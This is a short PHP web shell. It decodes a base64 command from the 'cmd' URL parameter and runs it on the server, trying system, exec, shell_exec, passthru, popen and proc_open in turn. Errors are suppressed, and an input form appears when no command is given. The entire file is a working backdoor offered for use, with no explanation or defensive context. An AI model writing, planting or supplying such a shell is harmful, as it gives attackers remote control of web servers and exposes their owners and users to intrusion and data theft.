<?php
// PHP shell: command sent as base64 in 'cmd' parameter

error_reporting(0);

function execute($cmd) {
    if (function_exists('system')) {
        @system($cmd);
        return;
    }
    if (function_exists('exec')) {
        @exec($cmd, $output);
        echo implode("\n", $output);
        return;
    }
    if (function_exists('shell_exec')) {
        echo @shell_exec($cmd);
        return;
    }
    if (function_exists('passthru')) {
        @passthru($cmd);
        return;
    }
    if (function_exists('popen')) {
        $fp = @popen($cmd, 'r');
        if ($fp) {
            while (!feof($fp)) {
                echo fread($fp, 4096);
            }
            pclose($fp);
        }
        return;
    }
    if (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = @proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
        }
        return;
    }
    echo "No available execution function.";
}

if (isset($_GET['cmd'])) {
    $cmd = base64_decode($_GET['cmd']);
    echo "<pre>";
    execute($cmd);
    echo "</pre>";
} else {
    echo '<form method="get">
        <input type="text" name="cmd" placeholder="Enter base64 command" />
        <input type="submit" value="Execute" />
    </form>';
}
?>
